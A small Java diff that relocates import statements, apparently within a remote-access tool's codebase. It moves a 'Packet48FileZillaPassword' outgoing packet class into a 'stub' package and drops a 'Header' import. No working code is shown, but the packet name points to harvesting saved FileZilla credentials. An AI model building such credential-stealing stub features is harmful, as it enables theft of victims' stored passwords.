@@ -12,8 +12,7 @@ import org.w3c.dom.NodeList;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
-import com.redpois0n.packets.outgoing.Packet48FileZillaPassword;
+import com.redpois0n.stub.packets.outgoing.Packet48FileZillaPassword;
 import com.redpois0n.utils.Utils;
 
 
